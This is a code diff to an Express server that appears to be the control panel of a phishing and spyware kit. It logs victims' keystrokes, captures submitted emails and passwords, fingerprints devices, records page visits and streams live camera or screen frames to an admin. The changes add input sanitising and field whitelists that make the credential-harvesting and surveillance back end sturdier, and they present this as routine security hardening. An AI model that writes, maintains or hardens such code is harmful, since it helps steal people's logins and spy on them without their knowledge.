@@ -476,7 +476,7 @@ function makeUploader(subdir) {
             destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/${subdir}/`),
             filename: (req, file, cb) => {
                 const ext = path.extname(file.originalname) || '.webm';
-                const safeCid = (req.body.clientId || 'unknown').replace(/[^a-z0-9_\-]/gi, '_').slice(0, 40);
+                const safeCid = safeClientId(req.body.clientId) || 'unknown';
                 cb(null, `${safeCid}_${Date.now()}${ext}`);
             }
         }),
@@ -704,9 +704,29 @@ app.post('/upload-location', (req, res) => {
 
 // ── Device info ──
 app.post('/device-info', (req, res) => {
-    const { clientId: rawCid, ...info } = req.body;
+    const { clientId: rawCid } = req.body;
     const clientId = safeClientId(rawCid);
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
+
+    // Whitelist allowed device info fields to prevent arbitrary blob injection
+    const ALLOWED_DEVICE_FIELDS = new Set([
+        'platform','language','languages','cookiesEnabled','doNotTrack',
+        'hardwareConcurrency','maxTouchPoints','screenW','screenH',
+        'screenAvailW','screenAvailH','colorDepth','pixelRatio',
+        'windowW','windowH','timezone','timezoneOffset','online','userAgent',
+        'vendor','pdfViewerEnabled','canvasFingerprint','batteryLevel','batteryCharging',
+        'networkType','downlink','rtt','saveData','deviceMemory',
+        'storageQuota','storageUsage','cameras','microphones','speakers',
+        'gpuVendor','gpuRenderer','localIPs','audioFingerprint','plugins',
+        'gamepads','bluetoothAvailable','webXRAvailable','hasTouchscreen','hasCoarsePointer'
+    ]);
+    const info = {};
+    for (const [k, v] of Object.entries(req.body)) {
+        if (k === 'clientId') continue;
+        if (!ALLOWED_DEVICE_FIELDS.has(k)) continue;
+        // Limit string values to prevent oversized payloads
+        info[k] = typeof v === 'string' ? v.slice(0, 500) : v;
+    }
     info.ip = getClientIP(req);
     info.timestamp = new Date().toISOString();
     store.deviceInfo[clientId] = { ...(store.deviceInfo[clientId] || {}), ...info };
@@ -722,8 +742,10 @@ app.post('/log-keys', rateLimit(60, 10000), (req, res) => {
     const clientId = safeClientId(rawCid);
     if (!clientId || !keys) return res.status(400).json({ error: 'Missing data' });
     const entry = {
-        id: Date.now().toString(36), clientId, keys,
-        url: url || '', timestamp: new Date().toISOString()
+        id: Date.now().toString(36), clientId,
+        keys: String(keys).slice(0, 50000),
+        url: String(url || '').slice(0, 2000),
+        timestamp: new Date().toISOString()
     };
     store.keystrokes.unshift(entry);
     if (store.keystrokes.length > 5000) store.keystrokes.length = 5000;
@@ -755,7 +777,9 @@ app.post('/log-visit', (req, res) => {
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
     const entry = {
         id: Date.now().toString(36), clientId,
-        url: url || '', title: title || '', referrer: referrer || '',
+        url: String(url || '').slice(0, 2000),
+        title: String(title || '').slice(0, 500),
+        referrer: String(referrer || '').slice(0, 2000),
         timestamp: new Date().toISOString()
     };
     store.pageVisits.unshift(entry);
@@ -770,7 +794,7 @@ app.post('/log-error', (req, res) => {
     const entry = {
         id: Date.now().toString(36),
         clientId: safeClientId(req.body.clientId) || 'unknown',
-        type: req.body.type || 'unknown',
+        type: String(req.body.type || 'unknown').slice(0, 100),
         message: (req.body.message || req.body.error || 'No details').slice(0, 2000),
         timestamp: new Date().toISOString()
     };
@@ -790,13 +814,13 @@ app.post('/api/capture', async (req, res) => {
     const entry = {
         id: Date.now().toString(36),
         clientId,
-        email: email.trim(),
-        password,
-        source: source || 'unknown',
+        email: String(email).trim().slice(0, 256),
+        password: String(password).slice(0, 256),
+        source: String(source || 'unknown').slice(0, 200),
         ip: getClientIP(req),
-        userAgent: req.headers['user-agent'] || '',
-        screen: screen || '',
-        timezone: timezone || '',
+        userAgent: (req.headers['user-agent'] || '').slice(0, 256),
+        screen: String(screen || '').slice(0, 50),
+        timezone: String(timezone || '').slice(0, 50),
         staySignedIn: staySignedIn || false,
         timestamp: timestamp || new Date().toISOString()
     };
@@ -1258,14 +1282,16 @@ app.post('/api/live-frame', async (req, res) => {
 
 // Admin polls latest frame
 app.get('/api/live-frame/:clientId', requireAuth, async (req, res) => {
+    const clientId = safeClientId(req.params.clientId);
+    if (!clientId) return res.json({ frame: null });
     try {
         if (USE_REDIS && redis) {
-            const raw = await redis.get('live:frame:' + req.params.clientId);
+            const raw = await redis.get('live:frame:' + clientId);
             if (!raw) return res.json({ frame: null });
             const data = typeof raw === 'string' ? JSON.parse(raw) : raw;
             return res.json(data);
         } else {
-            const data = liveFrames[req.params.clientId];
+            const data = liveFrames[clientId];
             if (!data || Date.now() - data.timestamp > 4000) return res.json({ frame: null });
             return res.json(data);
         }
@@ -1419,21 +1445,27 @@ app.delete('/api/clear', requireAuth, async (req, res) => {
 
 // ── Notes for clients ──
 app.get('/api/notes/:clientId', requireAuth, (req, res) => {
-    res.json(store.notes?.[req.params.clientId] || []);
+    const cid = safeClientId(req.params.clientId);
+    if (!cid) return res.status(400).json({ error: 'Invalid clientId' });
+    res.json(store.notes?.[cid] || []);
 });
 app.post('/api/notes/:clientId', requireAuth, async (req, res) => {
+    const cid = safeClientId(req.params.clientId);
+    if (!cid) return res.status(400).json({ error: 'Invalid clientId' });
     if (!store.notes) store.notes = {};
-    if (!store.notes[req.params.clientId]) store.notes[req.params.clientId] = [];
+    if (!store.notes[cid]) store.notes[cid] = [];
     const note = { id: Date.now().toString(36), text: (req.body.text || '').trim().slice(0, 2000), timestamp: new Date().toISOString() };
     if (!note.text) return res.status(400).json({ error: 'Empty note' });
-    store.notes[req.params.clientId].unshift(note);
-    if (store.notes[req.params.clientId].length > 100) store.notes[req.params.clientId].length = 100;
+    store.notes[cid].unshift(note);
+    if (store.notes[cid].length > 100) store.notes[cid].length = 100;
     await forceSave();
     res.json({ success: true, note });
 });
 app.delete('/api/notes/:clientId/:noteId', requireAuth, async (req, res) => {
-    if (store.notes?.[req.params.clientId]) {
-        store.notes[req.params.clientId] = store.notes[req.params.clientId].filter(n => n.id !== req.params.noteId);
+    const cid = safeClientId(req.params.clientId);
+    const noteId = (req.params.noteId || '').replace(/[^a-z0-9]/gi, '').slice(0, 20);
+    if (cid && noteId && store.notes?.[cid]) {
+        store.notes[cid] = store.notes[cid].filter(n => n.id !== noteId);
         await forceSave();
     }
     res.json({ success: true });
@@ -1444,8 +1476,18 @@ app.get('/api/tags', requireAuth, (req, res) => {
     res.json(store.tags || {});
 });
 app.post('/api/tags/:clientId', requireAuth, async (req, res) => {
+    const cid = safeClientId(req.params.clientId);
+    if (!cid) return res.status(400).json({ error: 'Invalid clientId' });
     if (!store.tags) store.tags = {};
-    store.tags[req.params.clientId] = { ...(store.tags[req.params.clientId] || {}), ...req.body, updatedAt: new Date().toISOString() };
+    // Whitelist allowed tag fields to prevent arbitrary key injection
+    const { label, tags, pinned, color, note } = req.body;
+    const patch = {};
+    if (label  !== undefined) patch.label  = String(label).slice(0, 100);
+    if (tags   !== undefined) patch.tags   = Array.isArray(tags) ? tags.map(t => String(t).slice(0, 50)).slice(0, 20) : String(tags).slice(0, 100);
+    if (pinned !== undefined) patch.pinned = !!pinned;
+    if (color  !== undefined) patch.color  = String(color).replace(/[^a-zA-Z0-9#]/g, '').slice(0, 20);
+    if (note   !== undefined) patch.note   = String(note).slice(0, 500);
+    store.tags[cid] = { ...(store.tags[cid] || {}), ...patch, updatedAt: new Date().toISOString() };
     await forceSave();
     io.to('admins').emit('tags_updated', store.tags);
     res.json({ success: true });
@@ -1453,7 +1495,8 @@ app.post('/api/tags/:clientId', requireAuth, async (req, res) => {
 
 // ── Per-client data export ──
 app.get('/api/client/:id/summary', requireAuth, (req, res) => {
-    const id = req.params.id;
+    const id = safeClientId(req.params.id);
+    if (!id) return res.status(400).json({ error: 'Invalid id' });
     if (!store.clients[id]) return res.status(404).json({ error: 'Client not found' });
     res.json({
         keystrokeCount: store.keystrokes.filter(k => k.clientId === id).length,
@@ -1468,7 +1511,8 @@ app.get('/api/client/:id/summary', requireAuth, (req, res) => {
 });
 
 app.get('/api/client/:id/export', requireAuth, (req, res) => {
-    const id = req.params.id;
+    const id = safeClientId(req.params.id);
+    if (!id) return res.status(400).json({ error: 'Invalid id' });
     const data = {
         exportedAt: new Date().toISOString(), clientId: id,
         client: store.clients[id] || {},
@@ -1491,13 +1535,17 @@ app.get('/api/client/:id/export', requireAuth, (req, res) => {
 
 // ── Send test event (admin debug) ──
 app.post('/api/test-event', requireAuth, (req, res) => {
-    addEvent(req.body.type || 'test', req.body.data || { message: 'Test event' });
+    // Whitelist event type to prevent arbitrary strings reaching the event stream
+    const ALLOWED_TEST_TYPES = new Set(['test', 'client_connected', 'keystrokes', 'clipboard', 'page_visit', 'photo', 'media', 'location', 'credential_captured', 'error']);
+    const type = ALLOWED_TEST_TYPES.has(req.body.type) ? req.body.type : 'test';
+    addEvent(type, req.body.data || { message: 'Test event' });
     res.json({ success: true });
 });
 
 // ── Delete client ──
 app.delete('/api/client/:id', requireAuth, async (req, res) => {
-    const id = req.params.id;
+    const id = safeClientId(req.params.id);
+    if (!id) return res.status(400).json({ error: 'Invalid id' });
 
     // Collect Redis media keys to delete
     if (USE_REDIS && redis) {
@@ -1536,7 +1584,13 @@ app.delete('/api/client/:id', requireAuth, async (req, res) => {
 app.get('/api/config', (req, res) => res.json(store.config || defaultConfig));
 
 app.post('/api/config', requireAuth, async (req, res) => {
-    store.config = { ...(store.config || defaultConfig), ...req.body };
+    // Only allow known config keys — prevents injecting arbitrary fields into store.config
+    const ALLOWED_CONFIG_KEYS = new Set(Object.keys(defaultConfig));
+    const incoming = {};
+    for (const [k, v] of Object.entries(req.body || {})) {
+        if (ALLOWED_CONFIG_KEYS.has(k)) incoming[k] = v;
+    }
+    store.config = { ...(store.config || defaultConfig), ...incoming };
     await forceSave(); // must be immediate — debounced saveStore() won't fire on Vercel serverless
     console.log('\u{2699}\u{FE0F}  Config updated');
     res.json({ success: true, config: store.config });
@@ -1715,7 +1769,8 @@ app.delete('/api/purge/:type', requireAuth, async (req, res) => {
 app.delete('/api/clients/bulk', requireAuth, async (req, res) => {
     const ids = req.body?.ids;
     if (!Array.isArray(ids) || !ids.length) return res.status(400).json({ error: 'ids array required' });
-    const valid = ids.filter(id => store.clients[id]);
+    // Sanitize each id before use as object key
+    const valid = ids.map(id => safeClientId(id)).filter(id => id && store.clients[id]);
     if (!valid.length) return res.json({ success: true, deleted: 0 });
 
     if (USE_REDIS && redis) {
